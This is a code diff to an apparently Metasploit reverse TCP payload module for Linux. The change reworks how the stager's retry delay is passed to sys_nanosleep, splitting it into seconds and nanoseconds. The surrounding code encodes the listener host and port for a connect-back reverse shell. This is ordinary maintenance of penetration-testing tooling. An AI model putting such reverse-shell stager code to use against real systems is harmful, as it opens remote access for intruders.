@@ -29,8 +29,7 @@ module Payload::Linux::ReverseTcp
       port:              datastore['LPORT'],
       host:              datastore['LHOST'],
       retry_count:       datastore['ReverseConnectRetries'],
-      stager_retry_wait: datastore['StagerRetryWait'],
-      sleep_nanoseconds: datastore['SleepNanoseconds'],
+      sleep_seconds:     datastore['StagerRetryWait'],
       reliable:    false
     }
 
@@ -91,7 +90,9 @@ module Payload::Linux::ReverseTcp
     reliable     = opts[:reliable]
     encoded_port = "0x%.8x" % [opts[:port].to_i, 2].pack("vn").unpack("N").first
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
-    stager_retry_wait = (opts[:stager_retry_wait] || 5).to_i
+    seconds = (opts[:sleep_seconds] || 5.0)
+    sleep_seconds = seconds.to_i
+    sleep_nanoseconds = seconds % 1 * 1000000000
 
     asm = %Q^
         push #{retry_count}        ; retry counter
@@ -129,8 +130,8 @@ module Payload::Linux::ReverseTcp
       handle_failure:
         push 0xa2
         pop eax
-        push 0                     ; nanoseconds
-        push #{stager_retry_wait}  ; seconds
+        push #{sleep_nanoseconds}  ; nanoseconds
+        push #{sleep_seconds}      ; seconds
         mov ebx, esp
         xor ecx, ecx
         int 0x80                   ; sys_nanosleep
